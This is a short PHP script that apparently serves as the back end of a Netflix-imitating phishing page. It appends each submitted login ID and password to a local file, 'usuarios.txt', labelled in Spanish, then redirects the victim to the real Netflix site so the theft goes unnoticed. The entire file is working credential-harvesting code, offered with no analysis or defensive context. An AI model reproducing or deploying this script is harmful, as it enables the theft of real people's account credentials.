<?php

file_put_contents("usuarios.txt", "Cuenta: " . $_POST['userLoginId'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.netflix.com');
exit();
?>
